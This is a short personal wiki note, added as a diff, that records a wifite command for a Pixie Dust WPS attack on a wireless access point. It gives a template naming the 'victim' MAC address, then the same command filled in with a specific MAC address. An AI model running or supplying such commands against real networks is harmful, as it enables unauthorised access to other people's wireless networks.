@@ -1,0 +1,12 @@
+Content-Type: text/x-zim-wiki
+Wiki-Format: zim 0.4
+Creation-Date: 2020-05-17T14:32:03-04:00
+
+====== wifite ======
+Created Sunday 17 May 2020
+
+wifite -b <MAC ADDRESS of victim> --quiet --pixie
+
+A0:63:91:D5:63:07 
+
+wifite -b A0:63:91:D5:63:07 --quiet --pixie
